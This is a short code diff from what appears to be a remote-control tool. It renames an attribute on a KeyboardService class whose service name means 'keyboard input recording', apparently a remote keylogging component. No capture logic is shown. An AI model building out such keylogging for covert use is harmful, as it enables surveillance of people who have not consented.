@@ -6,7 +6,7 @@ using SiMay.ServiceCore.Attributes;
 namespace SiMay.ServiceCore
 {
     [ServiceName("键盘输入记录")]
-    [ApplicationKeyAttribute(ApplicationKeyConstant.REMOTE_KEYBOARD)]
+    [ApplicationKey(ApplicationKeyConstant.REMOTE_KEYBOARD)]
     public class KeyboardService : ApplicationRemoteService
     {
         private Keyboard _keyboard;
